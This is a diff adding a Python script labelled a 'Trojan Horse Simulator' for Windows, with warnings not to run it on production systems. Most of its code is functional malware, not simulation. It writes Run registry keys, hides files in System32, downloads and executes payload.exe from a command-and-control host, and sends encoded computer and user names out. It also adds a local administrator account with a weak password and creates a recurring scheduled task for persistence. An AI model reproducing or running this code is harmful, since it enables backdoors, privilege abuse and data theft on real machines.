@@ -1,0 +1,159 @@
+#!/usr/bin/env python3
+# Trojan Horse Simulator - DO NOT RUN ON PRODUCTION SYSTEMS
+
+import os
+import sys
+import subprocess
+import urllib.request
+import base64
+import json
+
+class TrojanSimulator:
+    def __init__(self):
+        self.host = "http://malicious-server.com"
+        self.registry_keys = [
+            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+        ]
+    
+    def create_backdoor(self):
+        """Create persistent backdoor"""
+        print("Creating backdoor...")
+        
+        # Registry manipulation
+        for key in self.registry_keys:
+            self.modify_registry(key, "TrojanService", "C:\\Windows\\System32\\trojan.exe")
+        
+        # Create hidden files
+        self.create_hidden_files()
+        
+        # Network communication
+        self.establish_connection()
+    
+    def modify_registry(self, key, name, value):
+        """Modify Windows registry"""
+        try:
+            subprocess.run(["reg", "add", key, "/v", name, "/t", "REG_SZ", "/d", value, "/f"], 
+                         capture_output=True)
+            print(f"Registry modified: {key}")
+        except Exception as e:
+            print(f"Registry error: {e}")
+    
+    def create_hidden_files(self):
+        """Create hidden system files"""
+        hidden_files = [
+            "C:\\Windows\\System32\\svchost_backup.exe",
+            "C:\\Windows\\System32\\winlogon_backup.exe",
+            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat"
+        ]
+        
+        for file_path in hidden_files:
+            try:
+                with open(file_path, 'w') as f:
+                    f.write("echo Trojan activated")
+                os.system(f"attrib +h {file_path}")
+                print(f"Hidden file created: {file_path}")
+            except Exception as e:
+                print(f"File creation error: {e}")
+    
+    def establish_connection(self):
+        """Establish connection to command and control server"""
+        try:
+            # Download additional payload
+            payload_url = f"{self.host}/payload.exe"
+            urllib.request.urlretrieve(payload_url, "C:\\temp\\payload.exe")
+            
+            # Execute payload
+            subprocess.Popen(["C:\\temp\\payload.exe"], shell=True)
+            
+            # Send system information
+            system_info = {
+                "computer_name": os.environ.get("COMPUTERNAME", "Unknown"),
+                "username": os.environ.get("USERNAME", "Unknown"),
+                "os_version": os.sys.platform,
+                "architecture": os.sys.maxsize > 2**32 and "x64" or "x86"
+            }
+            
+            # Encode and send data
+            encoded_data = base64.b64encode(json.dumps(system_info).encode()).decode()
+            urllib.request.urlopen(f"{self.host}/collect?data={encoded_data}")
+            
+            print("Connection established with C&C server")
+            
+        except Exception as e:
+            print(f"Connection error: {e}")
+    
+    def keylogger_function(self):
+        """Simulate keylogger functionality"""
+        print("Keylogger activated...")
+        # This would normally capture keystrokes
+        # For simulation, we just log the function call
+        pass
+    
+    def data_exfiltration(self):
+        """Simulate data exfiltration"""
+        print("Exfiltrating data...")
+        
+        # Collect sensitive files
+        sensitive_paths = [
+            "C:\\Users\\%USERNAME%\\Documents",
+            "C:\\Users\\%USERNAME%\\Desktop",
+            "C:\\Users\\%USERNAME%\\Downloads"
+        ]
+        
+        for path in sensitive_paths:
+            try:
+                expanded_path = os.path.expandvars(path)
+                if os.path.exists(expanded_path):
+                    # In real malware, this would upload files
+                    print(f"Scanning: {expanded_path}")
+            except Exception as e:
+                print(f"Path error: {e}")
+    
+    def privilege_escalation(self):
+        """Attempt privilege escalation"""
+        print("Attempting privilege escalation...")
+        
+        # Try to run as administrator
+        try:
+            subprocess.run(["net", "user", "admin", "password123", "/add"], 
+                         capture_output=True)
+            subprocess.run(["net", "localgroup", "administrators", "admin", "/add"], 
+                         capture_output=True)
+            print("Privilege escalation attempted")
+        except Exception as e:
+            print(f"Privilege escalation error: {e}")
+    
+    def persistence_mechanism(self):
+        """Establish persistence"""
+        print("Setting up persistence...")
+        
+        # Create scheduled task
+        task_command = "schtasks /create /tn 'SystemUpdate' /tr 'C:\\Windows\\System32\\trojan.exe' /sc minute /mo 5"
+        try:
+            subprocess.run(task_command, shell=True, capture_output=True)
+            print("Scheduled task created")
+        except Exception as e:
+            print(f"Task creation error: {e}")
+    
+    def run(self):
+        """Main execution function"""
+        print("Trojan simulator starting...")
+        
+        # Execute all malicious functions
+        self.create_backdoor()
+        self.keylogger_function()
+        self.data_exfiltration()
+        self.privilege_escalation()
+        self.persistence_mechanism()
+        
+        print("Trojan simulation completed")
+
+if __name__ == "__main__":
+    # WARNING: This is a simulation for testing purposes only
+    # DO NOT run this on production systems
+    print("WARNING: This is a malware simulation for testing purposes only!")
+    print("DO NOT run this on production systems!")
+    
+    # Uncomment the line below to run the simulation
+    # TrojanSimulator().run()
